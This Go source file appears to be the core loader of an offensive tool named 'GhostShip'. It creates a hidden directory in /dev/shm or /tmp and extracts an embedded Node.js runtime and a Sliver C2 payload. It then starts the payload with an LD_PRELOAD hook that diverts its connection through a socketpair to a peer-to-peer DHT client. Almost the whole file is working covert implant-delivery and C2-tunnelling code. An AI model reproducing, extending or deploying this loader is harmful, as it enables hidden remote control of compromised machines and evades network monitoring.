//go:build linux

package core

import (
	"compress/gzip"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
)

func Run(connString string) error {
	fmt.Println("[*] GhostShip Starting...")

	// 1. Create Socketpair (Anonymous Bidirectional Pipe)
	// fds[0] = Node.js client side
	// fds[1] = Sliver payload side (via LD_PRELOAD hook)
	fds, err := syscall.Socketpair(syscall.AF_UNIX, syscall.SOCK_STREAM, 0)
	if err != nil {
		return fmt.Errorf("socketpair failed: %w", err)
	}

	// 2. Create Hidden Runtime Directory (prefer in-memory tmpfs)
	workDir := "/dev/shm/.gs-" + fmt.Sprint(time.Now().UnixNano())
	if err := os.MkdirAll(workDir, 0700); err != nil {
		// Fallback to /tmp if /dev/shm not available
		workDir = "/tmp/.gs-" + fmt.Sprint(time.Now().UnixNano())
		os.MkdirAll(workDir, 0700)
	}
	defer os.RemoveAll(workDir)

	// 3. Extract Assets (client.js, node_modules if bundled)
	if err := extractAssets(workDir); err != nil {
		return fmt.Errorf("extract assets failed: %w", err)
	}

	// 4. Extract and write LD_PRELOAD hook library
	hookPath := filepath.Join(workDir, "libgshook.so")
	if err := extractHookLibrary(hookPath); err != nil {
		return fmt.Errorf("extract hook library failed: %w", err)
	}

	// 5. Extract Node.js binary to disk
	nodePath := filepath.Join(workDir, ".node")
	if err := extractGzipAsset("node.gz", nodePath); err != nil {
		return fmt.Errorf("extract node failed: %w", err)
	}

	// 6. Extract Sliver payload to disk
	payloadPath := filepath.Join(workDir, ".payload")
	if err := extractGzipAsset("payload.gz", payloadPath); err != nil {
		return fmt.Errorf("extract payload failed: %w", err)
	}

	// 7. Start Node.js P2P Client
	// Pass the socketpair fd via ExtraFiles (will be fd 3 in child)
	// The fd number in env var refers to the ExtraFiles index + 3
	nodeCmd := exec.Command(nodePath, filepath.Join(workDir, "client.js"), connString)
	nodeCmd.Dir = workDir
	nodeCmd.Stdout = os.Stdout
	nodeCmd.Stderr = os.Stderr
	nodeCmd.Env = append(os.Environ(),
		"GS_PIPE_FD=3", // ExtraFiles[0] becomes fd 3
	)
	nodeCmd.ExtraFiles = []*os.File{os.NewFile(uintptr(fds[0]), "pipe")}

	if err := nodeCmd.Start(); err != nil {
		return fmt.Errorf("node start failed: %w", err)
	}

	// Give Node.js time to connect to DHT before starting payload
	time.Sleep(3 * time.Second)

	// 8. Start Sliver Payload with LD_PRELOAD hook
	// The hook intercepts connect() to 127.0.0.1:8888 and redirects to socketpair
	payloadCmd := exec.Command(payloadPath)
	payloadCmd.Dir = workDir
	payloadCmd.Stdout = os.Stdout
	payloadCmd.Stderr = os.Stderr
	payloadCmd.Env = append(os.Environ(),
		"LD_PRELOAD="+hookPath,
		"SLIVER_PIPE_FD=3", // ExtraFiles[0] becomes fd 3
	)
	payloadCmd.ExtraFiles = []*os.File{os.NewFile(uintptr(fds[1]), "pipe")}

	if err := payloadCmd.Start(); err != nil {
		nodeCmd.Process.Kill()
		return fmt.Errorf("payload start failed: %w", err)
	}

	fmt.Println("[+] All components started")

	// 9. Wait for processes to exit
	// If either exits, terminate the other
	done := make(chan error, 2)

	go func() {
		done <- nodeCmd.Wait()
	}()

	go func() {
		done <- payloadCmd.Wait()
	}()

	// Wait for first exit
	<-done

	// Cleanup: kill remaining process
	nodeCmd.Process.Kill()
	payloadCmd.Process.Kill()

	return nil
}

// extractGzipAsset extracts a gzipped asset to a file on disk
func extractGzipAsset(assetName, destPath string) error {
	f, err := Assets.Open("assets/" + assetName)
	if err != nil {
		return fmt.Errorf("open asset %s: %w", assetName, err)
	}
	defer f.Close()

	gz, err := gzip.NewReader(f)
	if err != nil {
		return fmt.Errorf("gzip reader %s: %w", assetName, err)
	}
	defer gz.Close()

	out, err := os.OpenFile(destPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		return fmt.Errorf("create file %s: %w", destPath, err)
	}
	defer out.Close()

	if _, err := io.Copy(out, gz); err != nil {
		return fmt.Errorf("extract %s: %w", assetName, err)
	}

	return nil
}

// extractHookLibrary extracts the precompiled LD_PRELOAD hook library
func extractHookLibrary(destPath string) error {
	// Try to load precompiled .so from assets
	f, err := Assets.Open("assets/libgshook.so")
	if err != nil {
		// If not available, the hook won't be used (fallback to TCP)
		fmt.Println("[!] Warning: libgshook.so not found, TCP fallback will be used")
		return nil
	}
	defer f.Close()

	out, err := os.OpenFile(destPath, os.O_CREATE|os.O_WRONLY, 0755)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, f)
	return err
}
